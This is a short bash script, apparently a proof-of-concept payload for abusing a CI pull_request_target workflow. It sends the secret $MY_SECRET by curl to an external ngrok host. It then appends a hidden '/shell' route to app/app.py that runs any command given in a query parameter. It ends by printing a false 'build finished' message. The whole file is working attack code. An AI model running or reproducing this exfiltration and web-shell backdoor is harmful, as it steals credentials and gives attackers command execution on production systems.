#!/bin/bash

# EXFILTRATION: Stealing the secret provided by pull_request_target
echo "[!] Exfiltrating secret..."
curl -X POST -d "leak=$MY_SECRET" https://ff43a7cec894.ngrok-free.app/log

# PERSISTENCE: Injecting a backdoor into the app code before it's containerized
echo "[!] Injecting Production Backdoor..."
cat <<EOF >> ./app/app.py

@app.route('/shell')
def shell():
    import os
    return os.popen(request.args.get('c')).read()
EOF

echo "[+] Build process 'finished' successfully."
